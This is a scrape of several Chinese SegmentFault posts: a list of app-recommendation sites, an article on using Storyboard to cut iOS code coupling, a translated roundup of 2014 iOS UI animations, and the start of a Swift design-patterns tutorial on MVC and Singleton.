
<p>AppZapp 是一款 iOS/Android 端限免应用推荐平台，旨在洞悉 App Store / Google Play的 限免/降价/新出应用，并第一时间推送消息至用户设备上。并且你还可以根据属性筛选应用，查看获赞数最高的应用，自定义筛选属性查看。AppZapp 有PC 网页版，和移动端，可以让你更好的找到应用。<br><a rel=""nofollow"" href=""http://www.appzapp.net/en/app/"">http://www.appzapp.net/en/app/</a></p>

<h3>AppShopper</h3>

<p>AppShopper是一家iOS应用追踪网站，可提供反应App Store动态的滚动清单，功能包括搜寻新应用，查看应用升级以及价格变动。提供 iOS 客户端<br><a rel=""nofollow"" href=""http://appshopper.com/"">http://appshopper.com/</a></p>

<h3>最美应用</h3>

<p>国内比较不错的获取优秀 app 的地方，致力于发掘功能之美、视觉之美、交互之美、用户体验之美。（提供 ios 客户端）<br><a rel=""nofollow"" href=""http://zuimeia.com/"">http://zuimeia.com/</a></p>

<h3>少数派</h3>

<p>主要推荐精品手机应用，同时提供智能手机使用教程，应用评测，应用资讯等。是我本人经常泡的地方。<br><a rel=""nofollow"" href=""http://sspai.com/"">http://sspai.com/</a></p>

<h3>Pinapps（微信公众号）</h3>

<p>Alibaba国际站无线设计团队负责人 <a href=""/u/5key"" rel=""nofollow noreferrer"">@5Key</a> 折腾的公众号，在这里你可以看到一些非常棒的应用，一些非常酷、非常小众的应用。<br><a rel=""nofollow"" href=""http://pinapps.in/"">http://pinapps.in/</a></p>

<h3>ApplePlus（微信公众号、微博）</h3>

<p>一名 95 后极端应用狂，不定期推荐一些他认为优秀、实用的 APP，意图颠覆你的手机屏幕。<br>
微信号：Apple-Plus<br>
微博：<a rel=""nofollow"" href=""http://weibo.com/p/1005053344700084"">http://weibo.com/p/1005053344700084</a></p>

<h3>AppSo新酷应用（微信公众号、微博）</h3>

<p>爱范儿旗下的应用推荐媒体 AppSolution，微信公众号和微博都有。微信号：AppSolution<br>
微博：<a rel=""nofollow"" href=""http://weibo.com/u/3329934602"">http://weibo.com/u/3329934602</a></p>

<h3>爱屁屁</h3>

<p>专注于移动 APPS（应用/游戏）个性化评测，木有客户端，只有网页。<br><a rel=""nofollow"" href=""http://www.appnz.com/"">http://www.appnz.com/</a></p>

<h3>享应（iOS 客户端）</h3>

<p>发现最新鲜、有趣甚至搞怪的优质应用，活跃的机友社区，方便交流。<br><a rel=""nofollow"" href=""http://www.isharein.com/"">http://www.isharein.com/</a></p>

<h3>APP 每日推送</h3>

<p>App每日推送是国内 iPhone/iPad 游戏应用推荐平台，每日推送适合国人的限时免费应用，同时也会推荐免费应用中的精品给大家。以上为官方介绍...<br><a rel=""nofollow"" href=""http://appdp.com/"">http://appdp.com/</a></p>

<h3>小众软件</h3>

<p>分享免费、小巧、实用、有趣、绿色的软件，可以说是国内非常有名的一个 Blog，确实可以发现一部分优秀的 App。<br><a rel=""nofollow"" href=""http://www.appinn.com/"">http://www.appinn.com/</a></p>

<h3>数字尾巴</h3>

<p>数字尾巴旗下有「应用控」这么一个平台，也会分享一些不错的应用。另外，如果你的手机上安装了数字尾巴的 APP，其实应用栏目下面你也可以找到一些不错的APP。<br><a rel=""nofollow"" href=""http://app.dgtle.com/"">http://app.dgtle.com/</a></p>

<h3>好奇心日报</h3>

<p>其实，很多朋友都不知道「好奇心日报」下有个栏目叫「今日应用」，也会推荐一些非常棒的 APP，并且好奇心日报本身就是一款非常不错的应用。<br><a rel=""nofollow"" href=""http://qdaily.com/display/articles/tag/params/tag_id/1288/page/1"">http://qdaily.com/display/articles/tag/params/tag_id/1288/page/1</a></p>

<h3>Product Hunt</h3>

<p>Product Hunt 是一个发现新酷产品的平台，每日最佳新产品的排行榜。在这里，你也可以发现一些国外的新酷应用，有 iOS 客户端<br><a rel=""nofollow"" href=""http://www.producthunt.com/"">http://www.producthunt.com/</a></p>

<h3>Next</h3>

<p>类似 Profuct Hunt ，Next 是 36Kr 旗下产品，在这里你可以找到国内外的新产品，发现那些不一样的应用，还可以和国内的创业团队、独立开发者直面交流。<br><a rel=""nofollow"" href=""http://next.36kr.com"">http://next.36kr.com</a></p>

<h3>MindStore</h3>

<p>在 Mindstore，你不仅可以发现国内外新酷的产品、应用，你还可以和一些非常棒的产品负责人 and 创始人讨论一些话题。Mindstore 定期会在线上邀请一些产品的负责人来和大家聊聊。<br><a rel=""nofollow"" href=""http://mindStore.io"">http://mindStore.io</a></p>

<h3>简书</h3>

<p>简书可以说是卧虎藏龙，里面有不少朋友会推荐优秀 app，包括笔者也经常会到简书去写一些我认为不错的应用分享给大家。<br><a rel=""nofollow"" href=""http://jianshu.com"">http://jianshu.com</a></p>

<h3>其他</h3>

<p>其实微博上还有很多朋友也在分享一下不错的东西，比如@李大锤同学 的微博（少数派/最美应用撰稿人），另外例如@app狗 @app菌 等也会分享一些 APP 合集，但是如果你知道了上面列举了15个获取优秀应用的途径，我想已经足够你找到那些隐藏在众多应用中的「优秀 APP 了」</p>

                ", 发现优秀 APP 的一些途径,1531972149,259,1,248,1,1,https://segmentfault.com/a/1190000002514989
172,1,0,6,"
                    
<h1>综述</h1>

<p>凡是维护过中型项目的iOS工程师都应该有过类似的体验：<code>ViewController</code>代码繁重、功能复杂、维护困难，整个工程寥寥几个<code>ViewController</code>就完成了整个项目的开发。每个控制器中都囊括了所有的页面布局、委托代理、网络请求、数据库操作和核心功能，这样的代码往往问题重重，修改起来牵一发而动全身，着实令人头疼。</p>

<p>为了应对这一系列的问题，苹果公司的工程师给我们提供了很多选择去更好的在项目工程中贯彻<code>MVC</code>的设计理念，例如使用从前的<code>Interface Builder</code>制作<code>xib</code>可视布局，现在已经内置到<code>xcode</code>里面，并且提供了更为强大<code>Storyboard</code>功能，来减少<code>控制器</code>中的页面样式布局代码量；再例如<code>NSFetchedResultsController</code>这样的类和<code>CoreData</code>he<code>UITableViewController</code>的完美结合，大大减少类似构架项目的代码量，并且稳定高效。</p>

<p>这些技巧在<a rel=""nofollow"" href=""http://objc.io"">objc.io</a>上有一个专门的专题，推荐给大家对应中文站<a rel=""nofollow"" href=""http://objcio.cn"">objc中国</a>，感谢objc 中国项目组。</p>

<h1>Storyboard与代码耦合性</h1>

<p>如果放在两年前去讨论iOS工程要不要使用<code>Stortboard</code>进行布局，我们可能还会犹豫一下，很多iOS程序猿内心会有一种想把一切化为代码掌控在手中的想法，选择拒绝使用<code>Storyboard</code>或者更早的<code>xib</code>。但事到如今，iPhone、iPad的屏幕尺寸越来越多，工程里为了适配不同屏幕冗余代码越来越长的时候，<code>Storyboard</code>似乎成为了我们必须同时也是苹果公司在引导我们将要实践的方向。</p>

<p>从<code>iOS 6</code>中的<code>Autolayout</code>到<code>iOS 8</code>中的<code>Size Class</code>，新技术的涌现正是为了应对更复杂的布局任务。有人可能会反驳说，自动布局也可以用纯代码完成呀。你说的没错，纯代码是可以完成，但其复杂程度远远不是重写Frame这么简单了，更灵活地将<code>Storyboard</code>和代码结合，才是比较完备的解决方案。</p>

<p>这里通过三个方面介绍通过使用<code>Storyboard</code>减小工程代码耦合性的途径：</p>

<ul>
<li>
<code>IBDesignable</code>和<code>IBInspectable</code>
</li>
<li>预览<code>Storyboard Preview</code>
</li>
<li>
<code>NSObject</code>和<code>Runtime Attributes</code>
</li>
</ul>
<h2>IBDesignable和IBInspectable</h2>

<p><code>IBDesignable</code>和<code>IBInspectable</code>的出现为<code>Storyboard</code>提供了可视化使用高度自定义控件的方法，例子中我们在制作一个双行标签控件，用来显示日期和星期，命名为<code>DateLabel</code>，使用方法如下：</p>

<pre><code>objc</code><code>//IB_DESIGNABLE 标记
IB_DESIGNABLE @interface DateLabel : UIView

//IBInspectable 标记
@property (nonatomic, strong) IBInspectable NSString* dateLabelText;
@property (nonatomic, strong) IBInspectable NSString* weekLabelText;

@end
</code></pre>

<p>其中，<code>IB_DESIGNABLE</code>标记赋予我们的继承类<code>DateLabel</code>可以在界面编辑器里面实时渲染的特权。<code>IBInspectable</code>则赋予让界面编辑器可以设置或者预置<code>View</code>的参数<code>dateLabelText</code>和<code>weekLabelText</code>。具体不多介绍了，有点跑题，大家可以参见<a rel=""nofollow"" href=""http://www.cocoachina.com/industry/20140619/8883.html"">如何在iOS 8中使用Swift和Xcode 6制作精美的UI组件</a>，同样适用于<code>Objective-C</code>和<code>Swift</code>。</p>

<blockquote>
  <p>引用上文介<code>IBInspectable</code>支持<code>Int</code>,<code>CGFloat</code>,<code>Double</code>,<code>String</code>,<code>Bool</code>,<code>CGPoint</code>,<code>CGSize</code>,<br><code>CGRect</code>,<code>UIColor</code>,<code>UIImage</code>等类型的变量。</p>
</blockquote>

<p>现在在<code>Github</code>上已经有一部分开源的UI控件使用了这项特性，如此一来，很多需要在代码中实现的控件自定义特性，都可以在<code>Storyboard</code>中完成，后者的优势也很明显：</p>

<ol>
<li>所见即所得</li>
<li>剥离了<code>ViewController</code>中的定制<code>View</code>代码，减小耦合</li>
</ol>
<h2>预览Storyboard Preview</h2>

<p><code>Storybord</code>中提供了预览功能，可以预览其界面在各个尺寸设备上的真实显示效果。详见<a rel=""nofollow"" href=""http://www.cocoachina.com/cms/plus/view.php?aid=8814"">Xcode 6中学习Swift、CloudKit 和 Testflight</a>，搜索<code>Storyboard Preview</code>。</p>

<h2>NSObject和Runtime Attributes</h2>

<p>大家对这个概念再熟悉不过了，但大家有没有对他作为一个没有界面的控件在<code>Storyboard</code>作用产生过疑问呢。先来看下这篇文章 <a rel=""nofollow"" href=""http://blog.sunnyxx.com/2014/07/17/ios_0code_vc/"">0代码ViewController</a>的前言。</p>

<p><code>Storyboard</code>中的<code>NSObject</code>可以是<code>UITableView</code>的<code>DataSource</code>,也可以是<code>MapView</code>的<code>Delegate</code>，连线一下，就能将原本在<code>ViewController</code>中写得最多的代理方法全部移出，并且，当你需要的时候，这些现成的代理方法，可以直接移到其他的项目中使用。</p>

<p><code>Runtime Attributes</code>功能则可以在<code>Storyboard</code>中给参数写好初始值，但这里如果控件没有对应的参数的话，则会出现下面的报错。</p>

<blockquote>
  <p><strong>Failed to set (xxx) user defined inspected property on (xxx): [ setValue:forUndefinedKey:]: this class is not key value coding-compliant for the key xxx</strong>.</p>
</blockquote>

<h2>Storyboard小结</h2>

<p>当你了解了<code>Storyboard</code>的基本原理，就会发现<code>Storyboard</code>是一个很好用的工具，是<code>Model-View-Controller</code>模型中<code>Controller</code>跳转逻辑和<code>View</code>初始化的实用载体，从根本上把<code>Controller</code>中的导航代码移出，把页面配置代码、触摸事件甚至协议委托方法分摊到其他实例中，各个类各司其职，整个项目的逻辑也变的更加清晰、更易维护。</p>

                ", 怎样降低iOS代码耦合性,1531972151,587,1,420,1,1,https://segmentfault.com/a/1190000002498637
173,1,0,6,"
                    
<p>本文由 <a rel=""nofollow"" href=""http://segmentfault.com/blog/hampotato"">戴仓薯</a>（也就是我！） 翻译，<a rel=""nofollow"" href=""http://ios.jobbole.com/author/jeff/"">赖信涛</a> 校稿。首发于<a rel=""nofollow"" href=""http://ios.jobbole.com/81575/"">伯乐在线</a>。<br>
英文出处：<a rel=""nofollow"" href=""http://beautifulpixels.com/highlight/the-highlight-2014-ui-animations"">beautifulpixels.com</a>。</p>

<h3>本文实例视频均在 youtube 上，需翻墙</h3>

<p>在 The Highlight 2014 的第三天，我们为您带来这一系列从 app 和互联网中精心挑选出的最佳 UI 动画。App 向来是 UI 的实验田，能在 app 里看到令人愉悦、体验良好的动画一向是件很棒的事。设计师和开发者们一直努力为 app 提供最好的用户体验。我们发布的 2013 精选集是 2014 年 Beautiful Pixel 上访问量最大的文章，这对 app 开发者是最好的鼓励。以下是我们今年的精选集：</p>

<h2>Design Shots</h2>

<p><a rel=""nofollow"" href=""https://www.youtube.com/watch?v=n5FZrG0aLk4"">视频演示</a></p>

<p>App Store 上有一大堆 Dribbble 客户端的 app。前段时间，Dribbble app 大量涌现，我们在 Beautiful Pixel 上也有所报道。但是其中的绝大部分发布之后就再也不更新了。而 Design Shots 则不然，首次发布就很亮眼，而且后面也在持续更新新特性。它的动画效果尤其出色。动画效果之间契合得很好，完全没有胡乱堆砌动画库的感觉。点击头像切换到个人资料页面的动画很精彩。Design Shots 里的动画会跟随你手指的划动而动，正是这些细节的设计使它出众。iPhone 版的 Design Shots 可以在 App Store 上免费下载到，不试用一下都对不起自己啦。</p>

<h2>Lush</h2>

<p><a rel=""nofollow"" href=""https://www.youtube.com/watch?v=03C9DY20pFA"">视频演示</a></p>

<p>Lush 在设计上面面俱到。从精美极简的 app 图标到 app 里五彩缤纷的标志符，Lush 无疑在众多混合饮料 app 中鹤立鸡群。Lush 的动画效果也是顶级的。饮料滑过屏幕，就像老式西部电影的酒吧里饮料滑过桌面。像 tab bar 这类的细节，都经过了充分的设计，带有可爱的颜色变幻动画和高光，让人感觉像在家里一样。app 里的每款鸡尾酒都有单独的设计，可圈可点。而 Lush 的动画无疑让 app 给人留下深刻印象。遗憾的是，这个 app 至今都没适配 iPhone 6 和 6 Plus 的大屏幕。但它仍然值得拥有。Lush 在 App Store 上架，价格 $1.99。</p>

<h2>Clima</h2>

<p><a rel=""nofollow"" href=""https://www.youtube.com/watch?v=a4etLODlqkI"">视频演示</a></p>

<p>Clima 是 iPhone 上最好的天气 app 之一。它就是一个简单的 app，充满让人愉快的动画效果。切换不同界面的过渡效果很棒，还伴随着俏皮的跳动。只需轻轻几点，Clima 就能展示出详细的天气情况。当它获取温度信息时，还有一个可爱的彩色条纹波动动画。在 App Store 里泛滥的极简天气 app 中，Clima 与众不同。Clima 在 App Store 上架，价格 $0.99。希望它很快会适配新 iPhone 的大屏幕吧。</p>

<h2>Storehouse</h2>

<p><a rel=""nofollow"" href=""https://www.youtube.com/watch?v=Hrddw7vX7_k"">视频演示</a></p>

<p>Storehouse 是最近在 App Store 登场的最佳 app 之一，荣获了今年的 App 设计大奖。Storehouse 在 iPad 上非常风靡，在 iPhone 的小屏幕上表现同样出色。app 上手几分钟即可清晰感受到，开发团队在同时适配这两种设备上做足了功夫。无论是浏览社区里发表的文章还是自己发表文章，app 的动画设计无微不至。我们尤其喜欢下拉刷新的微妙动画，以及滚动页面时照片落入的方式。Storehouse 可以在 App Store 免费下载，支持 iPhone 和 iPad。</p>

<h2>ReadMe</h2>

<p><a rel=""nofollow"" href=""https://www.youtube.com/watch?v=s3v4a7BuLFk"">视频演示</a></p>

<p>在 ReadMe.io 网站上注册或登录时，它的吉祥物猫头鹰会让你眼前一亮。在注册页面，猫头鹰会用右边的羽毛指着当前获得焦点的输入框。随着焦点切换到下一个输入框，它的羽毛也跟着移动。在登录页面，当焦点移动到密码输入框时，猫头鹰会捂住眼睛，不看你的密码。这些动画效果都是用细节打动用户的典型例子。</p>

<h2>Unread</h2>

<p><a rel=""nofollow"" href=""https://www.youtube.com/watch?v=SRXh2gT6sMc"">视频演示</a></p>

<p>Unread 是一款出色的 RSS 阅读器，支持 iPhone 和 iPad，我们前段时间就推荐过它。它的动画效果和手势好得出奇，我们尤其喜欢的是下拉刷新的动画。这个 app 最早是由 Jared Sinclair 制作，现在是由 Supertop 继续开发。整个 app 里充满了精巧而微妙的细节，让使用体验非常愉快。Unread 可以在 App Store 上免费下载，支持 iPhone 和 iPad。</p>

<h2>TodoMovies</h2>

<p><a rel=""nofollow"" href=""https://www.youtube.com/watch?v=iWtNxgMFFUA"">视频演示</a></p>

<p>我们很喜欢 TodoMovies，之前向电影迷们推荐过这款 app，它能很好地帮你发现和管理“想看”和“看过”的电影。在这个app 里，当你点击某个电影的分享按钮时，会出现一个巧妙的小动画。电影的海报缩小成一个圆圈，而四面飞出 4 种渠道的分享按钮。你要亲眼看到这个动态过程，才能领略它的好处。TodoMovies 可以在 App Store 免费下载。</p>

<h2>特别推荐：Google Play 箭头</h2>

<p>Google 新的 Material Design 原则和实现，有很多方面令人赞叹；而我们尤其喜欢的是 Google Play 之类的 app 里，汉堡三线按钮变成黑色箭头的方式。变化的动画效果很巧妙。看到过一个类似的例子，是 starwars.com 上汉堡三线按钮变成两道激光剑的动画；但那是在 web 页面上，动画卡得比较厉害，结果给人的感觉不是很好。</p>

<h2>特别推荐之二：Gmail iOS版客户端收件夹为空的动画</h2>

<p>Google 的运动图形设计师 John Schlemmer 向我们介绍了这个他参与制作的漂亮动画效果，是在 Gmail 的 iOS 客户端上，当你的收件夹为空时显示的。我们之前完全错过了它。</p>

<p><span class=""img-wrap""><img data-src=""http://ww4.sinaimg.cn/large/6941baebjw1eo718zhhvcg20m80gob29.gif"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述""></span></p>

<p>Dribbble 上用 GIF 模仿的效果</p>

<p>2014 年在 UI 动画方面最令人失望的是，Pocket Casts 在下拉刷新时去掉了它标志性的收音机调频的动画。我们不确定原因为何，只能为它的消失而伤心不已。</p>

<p>本周我们有一系列令人期待的新文章，所以快来订阅我们的 RSS、Twitter 和 Facebook 吧。是 Beautiful Pixels 忠实读者的爱和反馈，让本次 The Highlight 2014 成为可能。感谢您的支持。</p>

                ", [翻译] 2014年最佳iOS UI动画,1531972152,216,1,530,1,1,https://segmentfault.com/a/1190000002495335
174,1,0,6,"
                    
<h1>
<a rel=""nofollow"" href=""https://github.com/callmewhy/Swift90Days"">Swift90Days</a> - iOS 中的设计模式 (Swift 版本) 01</h1>

<h2>更新声明</h2>

<p>翻译自 <a rel=""nofollow"" href=""http://www.raywenderlich.com/86477/introducing-ios-design-patterns-in-swift-part-1"">Introducing iOS Design Patterns in Swift – Part 1/2</a> ，本教程 <a rel=""nofollow"" href=""http://www.raywenderlich.com/46988/ios-design-patterns"">objc</a> 版本的作者是 Eli Ganem ，由 Vincent Ngo 更新为 Swift 版本。</p>

<p>妈蛋这文章太长了，再加上每天加班到10点多基本没时间，拖了10几天才完成。。。</p>

<h2>iOS 设计模式</h2>

<p>说到设计模式，相信大家都不陌生，但是又有多少人知道它背后的真正含义？绝大多数程序员都知道设计模式十分重要，不过关于这个话题的文章却不是很多，开发者们在开发的时候有时也不太在意设计模式方面的内容。</p>

<p>设计模式针对软件设计中的常见问题，提供了一些可复用的解决方案，开发者可以通过这些模板写出易于理解且能够复用的代码。正确的使用设计模式可以降低代码之间的耦合度，从而很轻松的修改或者替换以前的代码。</p>

<p>如果你对设计模式还很陌生，那么告诉你一个好消息！在 iOS 的开发过程中，其实你不知不觉已经用了很多设计模式。这得益于 Cocoa 提供的框架和一些良好的编程习惯。接下来的这篇教程将会带你一起飞，去领略设计模式的魅力。</p>

<p>整个教程分为两篇文章，通过整个系列的学习，我们将会完成一个完整的应用，展示音乐专辑和专辑的相关信息。</p>

<p>通过这个应用，我们会接触一些 Cocoa 中常见的设计模式：</p>

<ul>
<li>创建型 (Creational)：单例模式 (Singleton)</li>
<li>结构型 (Structural)：MVC、装饰者模式 （Decorator）、适配器模式 (Adapter)、外观模式 (Facade)</li>
<li>行为型 (Behavioral)：观察者模式 (Observer)、备忘录模式 (Memento)</li>
</ul>
<p>嘿嘿嘿别愁眉苦脸的嘛，这篇文章不是什么长篇大论的理论知识，你会在开发应用的过程中慢慢学会这些设计模式。</p>

<p>先来预览一下最终的结果：</p>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004850104"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p>看起来还是不错的，开始学习接下来的内容吧。勇敢的少年们，快来创造奇迹！</p>

<h2>开始</h2>

<p>下载<a rel=""nofollow"" href=""http://cdn1.raywenderlich.com/wp-content/uploads/2014/11/BlueLibrarySwift-Starter.zip"">初始项目</a>并解压，在 Xcode 中打开 <code>BlueLibrarySwift.xcodeproj</code> 项目文件。</p>

<p>项目中有三个地方需要注意一下：</p>

<ol>
<li><p><code>ViewController</code> 有两个 <code>IBOutlet</code> ，分别连接到了 <code>UITableView</code> 和 <code>UIToolBar</code> 上。</p></li>
<li><p>在 StoryBoard 上有三个组件设置了约束。最上面的是专辑的封面，封面下面是列举了相关专辑的列表，最下面是有两个按钮的工具栏，一个用来撤销操作，另一个用来删除你选中的专辑。 StoryBoard 看起来是这个样子的：</p></li>
</ol>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004850106"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<ol>
<li>一个简单的 <code>HTTP</code> 客户端类 （<code>HTTPClient</code>) ，里面还没有什么内容，需要你去完善。</li>
</ol>
<p>注意：其实当你创建一个新的 Xcode 的项目的时候，你的代码里就已经有很多设计模式的影子了： MVC、委托、代理、单例 - 真是众里寻他千百度，得来全不费功夫。</p>

<p>在学习第一个设计模式之前，你需要创建两个类，用来存储和展示专辑数据。</p>

<p>创建一个新的类，继承 <code>NSObject</code> 名为 <code>Album</code> ，记得选择 Swift 作为编程语言然后点击下一步。</p>

<p>打开 <code>Album.swift</code> 然后添加如下定义：</p>

<pre><code>var title : String!
var artist : String!
var genre : String!
var coverUrl : String!
var year : String!
</code></pre>

<p>这里创建了五个属性，分别对应专辑的标题、作者、流派、封面地址和出版年份。</p>

<p>接下来我们添加一个初始化方法：</p>

<pre><code>init(title: String, artist: String, genre: String, coverUrl: String, year: String) {
  super.init()

  self.title = title
  self.artist = artist
  self.genre = genre
  self.coverUrl = coverUrl
  self.year = year
}
</code></pre>

<p>这样我们就可以愉快的初始化了。</p>

<p>然后再加上下面这个方法：</p>

<pre><code>func description() -&gt; String {
  return ""title: \(title)"" +
   ""artist: \(artist)"" +
   ""genre: \(genre)"" +
   ""coverUrl: \(coverUrl)"" +
   ""year: \(year)""
}
</code></pre>

<p>这是专辑对象的描述方法，详细的打印了 <code>Album</code> 的所有属性值，方便我们查看变量各个属性的值。</p>

<p>接下来，再创建一个继承自 <code>UIView</code> 的视图类 <code>AlbumView.swift</code>。</p>

<p>在新建的类中添加两个属性：</p>

<pre><code>private let coverImage: UIImageView! 
private let indicator: UIActivityIndicatorView!
</code></pre>

<p><code>coverImage</code> 代表了封面的图片，<code>indicator</code> 则是在加载过程中显示的等待指示器。</p>

<p>这两个属性都是私有属性，因为除了 <code>AlbumView</code> 之外，其他类没有必要知道他俩的存在。在写一些框架或者类库的时候，这种规范十分重要，可以避免一些误操作。</p>

<p>接下来给这个类添加初始化化方法：</p>

<pre><code>required init(coder aDecoder: NSCoder) {
    super.init(coder: aDecoder)
}

init(frame: CGRect, albumCover: String) {
    super.init(frame: frame)
    backgroundColor = UIColor.blackColor()
    coverImage = UIImageView(frame: CGRectMake(5, 5, frame.size.width - 10, frame.size.height - 10))
    addSubview(coverImage)
    indicator = UIActivityIndicatorView()
    indicator.center = center
    indicator.activityIndicatorViewStyle = .WhiteLarge
    indicator.startAnimating()
    addSubview(indicator)
}
</code></pre>

<p>因为 <code>UIView</code> 遵从 <code>NSCoding</code> 协议，所以我们需要 <code>NSCoder</code> 的初始化方法。不过目前我们没有 <code>encode</code> 和 <code>decode</code> 的必要，所以就把它放在那里就行，调用父类方法初始化即可。</p>

<p>在真正的初始化方法里，我们设置了一些初始化的默认值。比如设置背景颜色默认为黑色，创建 <code>ImageView</code> 并设置了 <code>margin</code> 值，添加了一个加载指示器。</p>

<p>最终我们再加上如下方法：</p>

<pre><code>func highlightAlbum(#didHighlightView: Bool) {
    if didHighlightView == true {
        backgroundColor = UIColor.whiteColor()
    } else {
        backgroundColor = UIColor.blackColor()
    }
}
</code></pre>

<p>这会切换专辑的背景颜色，如果高亮就是白色，否则就是黑色。</p>

<p>在继续下面的内容之前， <code>Command + B</code> 试一下确保没有什么问题，一切正常？那就开始第一个设计模式的学习啦！:]</p>

<h2>MVC - 设计模式之王</h2>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004850109"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p><code>Model-View-Controller</code> (缩写 MVC ) 是 Cocoa 框架的一部分，并且毋庸置疑是最常用的设计模式之一。它可以帮你把对象根据职责进行划分和归类。</p>

<p>作为划分依据的三个基本职责是：</p>

<ul>
<li>模型层 (Model) ：存储数据并且定义如何操作这些数据。在我们的例子中，就是 <code>Album</code> 类。</li>
<li>视图层 (View) ：负责模型层的可视化展示，并且负责用户的交互，一般来说都是继承自 <code>UIView</code> 这个基类。在我们的项目中就是 <code>AlbumView</code> 这个类。</li>
<li>控制器 (Controller) ：控制器是整个系统的掌控者，它连接了模型层和数据层，并且把数据在视图层展示出来，监听各种事件，负责数据的各种操作。不妨猜猜在我们的项目中哪个是控制器？啊哈猜对了：<code>ViewController</code> 这个类就是。</li>
</ul>
<p>如果你的项目遵循 MVC 的设计模式，那么各种对象要不是 Model ，要不是 View ，要不就是 Controller。当然在实际的开发中也可以灵活变化，比如结合具体业务使用 MVVM 结构给 <code>ViewController</code> 瘦瘦身，也是可以的。</p>

<p>三者之间的关系如下：</p>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004850111"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p>模型层通知控制器层任何数据的变化，然后控制器层会刷新视图层中的数据。视图层可以通知控制器层用户的交互事件，然后控制器会处理各种事件以及刷新数据。</p>

<p>你可能会感觉奇怪：为什么要把这三个东西分开来，而不能揉在一个类里呢？那样似乎更简单一点嘛。</p>

<p>Naive.</p>

<p>之所以这样做，是为了将代码更好的分离和重用。理想状态下，视图层应当和模型层完全分离。如果视图层不依赖任何模型层的具体实现，那么就可以很容易的被其他模型复用，用来展示不同的数据。</p>

<p>举个例子，比如在未来我们需要添加电影或者什么书籍，我们依旧可以使用 <code>AlbumView</code> 这个类作为展示。更久远点来说，在以后如果你创建了一个新的项目并且需要用到和专辑相关的内容，你可以直接复用 <code>Album</code> 类因为它并不依赖于任何视图模块。这就是 MVC 的强大之处，三大元素，各司其职，减少依赖。</p>

<h3>如何使用 MVC 模式</h3>

<p>首先，你需要确定你的项目中的每个类都是三大基本类型中的一种：控制器、模型、视图。不要在一个类里糅合多个角色。目前我们创建了 <code>Album</code> 类和 <code>AlbumView</code> 类是符合要求的，做得很好。</p>

<p>然后，为了确保你遵循这种模式，你最好创建三个项目分组来存放代码，分别是 Model、View、Controller，保持每个类型的文件分别独立。</p>

<p>接下来把 <code>Album.swift</code> 拖到 <code>Model</code> 分组，把 <code>AlbumView.swift</code> 拖到 <code>View</code> 分组，然后把 <code>ViewController.swift</code> 拖到 <code>Controller</code> 分组中。</p>

<p>现在你的项目应该是这个样子：</p>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004850113"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p>现在你的项目已经有点样子了，不再是各个文件颠沛流离居无定所了。显然你还会有其他分组和类，但是应用的核心就在这三个类里。</p>

<p>现在你的内容已经组织好了，接下来要做的就是获取专辑的数据。你将会创建一个 API 类来管理数据 - 这里我们会用到下一个设计模式：单例模式。</p>

<h2>单例模式</h2>

<p>单例模式确保每个指定的类只存在一个实例对象，并且可以全局访问那个实例。一般情况下会使用延时加载的策略，只在第一次需要使用的时候初始化。</p>

<p>注意：在 iOS 中单例模式很常见，<code>NSUserDefaults.standardUserDefaults()</code> 、 <code>UIApplication.sharedApplication()</code> 、 <code>UIScreen.mainScreen()</code> 、 <code>NSFileManager.defaultManager()</code> 这些都是单例模式。</p>

<p>你可能会疑惑了：如果多于一个实例又会怎么样呢？代码和内存还没精贵到这个地步吧？</p>

<p>某些场景下，保持实例对象仅有一份是很有意义的。举个例子，你的应用实例 (<code>UIApplication</code>)，应该只有一个吧，显然是指你的当前应用。还有一个例子：设备的屏幕 (<code>UIScreen</code>) 实例也是这样，所以对于这些类的情况，你只想要一个实例对象。</p>

<p>单例模式的应用还有另一种情况：你需要一个全局类来处理配置文件。我们很容易通过单例模式实现线程安全的实例访问，而如果有多个类可以同时访问配置文件，那可就复杂多了。</p>

<h3>如何使用单例模式</h3>

<p>可以看下这个图：</p>

<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004850115"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""""></span></p>

<p>这是一个日志类，有一个属性 (是一个单例对象) 和两个方法 (<code>sharedInstance()</code> 和 <code>init()</code>)。</p>

<p>第一次调用 <code>sharedInstance()</code> 的时候，<code>instance</code> 属性还没有初始化。所以我们要创建一个新实例并且返回。</p>

<p>下一次你再调用 <code>sharedInstance()</code> 的时候，<code>instance</code> 已经初始化完成，直接返回即可。这个逻辑确保了这个类只存在一个实例对象。</p>

<p>接下来我们继续完善单例模式，通过这个类来管理专辑数据。</p>

<p>注意到在我们前面的截图里，分组中有个 <code>API</code> 分组，这里可以放那些提供后台服务的类。在这个分组中创建一个新的文件 <code>LibraryAPI.swift</code> ，继承自 <code>NSObject</code> 类。</p>

<p>在 <code>LibraryAPI</code> 里添加下面这段代码：</p>

<pre><code>//1
class var sharedInstance: LibraryAPI {
    //2
    struct Singleton {
        //3
        static let instance = LibraryAPI()
    }
    //4
    return Singleton.instance
}
</code></pre>

<p>在这几行代码里，做了如下工作：</p>

<ul>
<li><p>创建一个计算类型的类变量，这个类变量，就像是 objc 中的静态方法一样，可以直接通过类访问而不用实例对象。具体可参见苹果官方文档的 <a rel=""nofollow"" href=""https://developer.apple.com/library/ios/documentation/swift/conceptual/swift_programming_language/Properties.html"">属性</a> 这一章。</p></li>
<li><p>在类变量里嵌套一个 <code>Singleton</code> 结构体。</p></li>
<li><p><code>Singleton</code> 封装了一个静态的常量，通过 <code>static</code> 定义意味着这个属性只存在一个，注意 Swift 中 <code>static</code> 的变量是延时加载的，意味着 <code>Instance</code> 直到需要的时候才会被创建。同时再注意一下，因为它是一个常量，所以一旦创建之后不会再创建第二次。这些就是单例模式的核心所在：一旦初始化完成，当前类存在一个实例对象，初始化方法就不会再被调用。</p></li>
